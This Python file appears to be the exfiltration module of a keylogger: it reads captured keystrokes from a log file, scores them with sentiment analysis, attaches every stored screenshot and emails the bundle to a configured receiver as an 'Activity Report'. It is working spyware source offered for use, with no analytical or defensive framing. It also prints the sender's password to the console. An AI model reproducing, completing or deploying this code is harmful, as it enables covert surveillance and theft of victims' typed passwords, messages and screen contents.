import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import json
import os
from modules.sentiment_analysis import analyze_sentiment
from dotenv import load_dotenv


load_dotenv()


with open("config.json") as f:
    config = json.load(f)


def send_report():

    email_config = {
        "sender": os.getenv("SENDER_EMAIL"),
        "password": os.getenv("SENDER_PASSWORD"),
        "receiver": config["email"]["receiver"],
        "smtp_server": config["email"]["smtp_server"],
        "smtp_port": config["email"]["smtp_port"]
    }

    print("Email Configuration:", email_config)

    msg = MIMEMultipart()
    msg["From"] = email_config["sender"]
    msg["To"] = email_config["receiver"]
    msg["Subject"] = "Activity Report"

    try:
        
        with open("logs/keylogs.txt", "r") as f:
            body = f.read()
            sentiment_result = analyze_sentiment(body)
            if sentiment_result:
                body += f"\n\nSentiment Analysis:\nSentiment: {sentiment_result['sentiment']}\nScore: {sentiment_result['score']}"
        msg.attach(MIMEText(body, "plain"))
        

    except Exception as e:
        print(f"Error reading logs: {e}")

    try:
        
        screenshot_dir = "logs/screenshots"
        for filename in os.listdir(screenshot_dir):
            filepath = os.path.join(screenshot_dir, filename)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename={filename}",
                    )
                    msg.attach(part)


    except Exception as e:
        print(f"Error attaching screenshots: {e}")


    try:
        
        with smtplib.SMTP(email_config["smtp_server"], email_config["smtp_port"]) as server:
            server.starttls()
            server.login(email_config["sender"], email_config["password"])
            server.send_message(msg)
        print("Report sent via email.")


    except smtplib.SMTPAuthenticationError as e:
        print(f"Failed to send email: {e}")


    except Exception as e:
        print(f"Error sending email: {e}")

def test_email():
    email_config = {
        "sender": os.getenv("SENDER_EMAIL"),
        "password": os.getenv("SENDER_PASSWORD"),
        "receiver": config["email"]["receiver"],
        "smtp_server": config["email"]["smtp_server"],
        "smtp_port": config["email"]["smtp_port"]
    }

    msg = MIMEMultipart()
    msg["From"] = email_config["sender"]
    msg["To"] = email_config["receiver"]
    msg["Subject"] = "Test Email"
    msg.attach(MIMEText("This is a test email.", "plain"))

    try:
        with smtplib.SMTP(email_config["smtp_server"], email_config["smtp_port"]) as server:
            server.starttls()
            server.login(email_config["sender"], email_config["password"])
            server.send_message(msg)
        print("Test email sent successfully.")
    except Exception as e:
        print(f"Failed to send test email: {e}")




# test_email()


